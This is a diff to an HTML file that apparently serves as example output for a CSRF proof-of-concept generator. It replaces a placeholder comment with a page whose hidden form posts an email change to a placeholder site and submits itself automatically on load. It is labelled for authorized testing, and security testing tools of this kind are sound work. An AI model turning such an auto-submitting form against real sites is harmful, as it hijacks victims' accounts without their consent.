@@ -1,7 +1,18 @@
-<!--
-Role:
-    Example generated CSRF PoC output.
-
-Later this file can show what the tool is expected to create from
-examples/sample_request.txt.
--->
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>CSRF PoC</title>
+</head>
+<body>
+  <p>For authorized security testing only.</p>
+  <form action="https://example.com/change-email" method="POST">
+    <input type="hidden" name="email" value="test@example.com">
+    <input type="hidden" name="display_name" value="Test User">
+    <button type="submit">Submit request</button>
+  </form>
+  <script>
+    document.forms[0].submit();
+  </script>
+</body>
+</html>
